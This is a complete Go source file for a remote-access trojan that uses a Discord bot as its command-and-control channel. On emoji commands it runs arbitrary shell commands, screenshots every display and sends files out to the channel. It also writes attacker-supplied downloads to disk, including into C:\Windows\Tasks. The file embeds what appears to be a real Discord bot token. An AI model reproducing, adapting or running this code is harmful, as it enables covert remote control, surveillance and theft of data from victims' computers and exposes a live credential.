// William Moody
// 08.12.2022

// 🏃‍♂️ <command           Run the given command (Windows: cmd.exe, Other: bash)
// 📸                    Take a screenshot
// 👇 <path>             Download the given file (Less than 8MB)
// ☝️ <path> *attach     Upload the attached file (Less than 8MB)
// 💀                    Kill the process

package main

import (
	"fmt"
	"os"
	"os/signal"
	"os/exec"
	"io"
	"net/http"
	"syscall"
	"runtime"
	"strings"
	"image/png"

	"github.com/kbinani/screenshot"
	"github.com/bwmarrin/discordgo"
)

func getTmpDir() string {
	if runtime.GOOS == "windows" {
		return "C:\\Windows\\Tasks\\"
	} else {
		return "/tmp/"
	}
}

func handler(s *discordgo.Session, m *discordgo.MessageCreate) {
	// Ignore own messages
    if m.Author.ID == s.State.User.ID {
        return
    }

	//Run command
	if strings.HasPrefix(m.Content, "🏃‍♂️") {
		var cmd *exec.Cmd
		if runtime.GOOS == "windows" {
			cmd = exec.Command("cmd.exe", "/k", m.Content[14:len(m.Content)])
		} else {
			cmd = exec.Command("bash", "-c", m.Content[14:len(m.Content)])
		}
		out, err := cmd.CombinedOutput()
		if err != nil {
			out = append(out, 0x0a)
			out = append(out, []byte(err.Error())...)
		}

		var resp strings.Builder
		resp.WriteString("```bash\n")
		resp.WriteString(string(out) + "\n")
		resp.WriteString("```")

		// Message is too long, save as file
		if (len(resp.String()) > 2000) {
			f, _ := os.CreateTemp("", "output-*.txt")
			f.Write(out)
			fileName := f.Name()
			f.Close()

			f, _ = os.Open(fileName)
			s.ChannelFileSend(m.ChannelID, fileName, f)
			f.Close()
		} else {
			s.ChannelMessageSend(m.ChannelID, resp.String())
		}
	} else if m.Content == "📸" {
		n := screenshot.NumActiveDisplays()
		for i := 0; i < n; i++ {
			bounds := screenshot.GetDisplayBounds(i)
			img, _ := screenshot.CaptureRect(bounds)

			fileName := fmt.Sprintf("%s%d_%dx%d.png", getTmpDir(), i, bounds.Dx(), bounds.Dy())
			file, _ := os.Create(fileName)
			png.Encode(file, img)
			defer file.Close()

			f, _ := os.Open(fileName)
			defer f.Close()
			s.ChannelFileSend(m.ChannelID, fileName, f)
		}
	} else if strings.HasPrefix(m.Content, "👇") {
		fileName := m.Content[5:len(m.Content)]
		f, _ := os.Open(fileName)
		defer f.Close()
		s.ChannelFileSend(m.ChannelID, fileName, f)
	} else if strings.HasPrefix(m.Content, "☝️") {
		path := m.Content[7:len(m.Content)]
		if len(m.Attachments) == 0 {
			s.ChannelMessageSend(m.ChannelID, "No file attached")
		} else {
			out, _ := os.Create(path)
			defer out.Close()
			resp, _ := http.Get(m.Attachments[0].URL)
			defer resp.Body.Close()
			io.Copy(out, resp.Body)
			s.ChannelMessageSend(m.ChannelID, "Uploaded file to " + path)
		}
	} else if m.Content == "💀" {
		syscall.Kill(syscall.Getpid(), syscall.SIGINT)
	}
}

func main() {
    dg, err := discordgo.New("Bot MTA1MDM3MjkyMDQwNjQ1NDMyMg.G4hOeG.wdXB96Wj537-4xP3dA9kGMxvc0pivGFuWERKIs")
    if err != nil {
		// Error creating Discord session
        return
    }

	// Handler for CreateMessage events
    dg.AddHandler(handler)
    dg.Identify.Intents = discordgo.IntentsGuildMessages

    err = dg.Open()
    if err != nil {
		// Error opening connection
        return
    }

    // Bot is now running (CTRL+C to quit)
    sc := make(chan os.Signal, 1)
    signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, os.Kill)
    <-sc

    dg.Close()
}